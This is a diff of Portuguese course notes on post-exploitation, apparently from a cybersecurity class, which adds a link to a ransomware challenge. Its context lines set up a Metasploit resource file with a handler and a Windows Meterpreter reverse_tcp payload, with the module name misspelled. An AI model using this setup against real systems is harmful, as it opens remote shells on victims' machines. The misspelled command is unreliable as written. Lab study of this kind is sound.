@@ -1,6 +1,8 @@
 # Pos Exploração 
 Last Update: 06/10/2025
 
+Desafio Adicional:https://github.com/cassiano-dio/cibersecurity-desafio-ransomware
+
 passo a Psso DIO
 ⭕ https://www.youtube.com/watch?v=icXw-N1HhmY&embeds_referring_origin=https%3A%2F%2Fweb.dio.me&source_ve_path=MjM4NTE
 
@@ -182,7 +184,7 @@ Arquivo de comandos, Rc de Run comands, criando o arquivo meterpreter.rc
  
 ▶️ nano meterpreter.rc
 
-Aqui abre nosso script, vamos montar eles
+Aqui abre nosso script vamos montar eles
 
 ▶️use exploit/multi/handlder
 ▶️ set payload windows/meterpreter/reverse_tcp
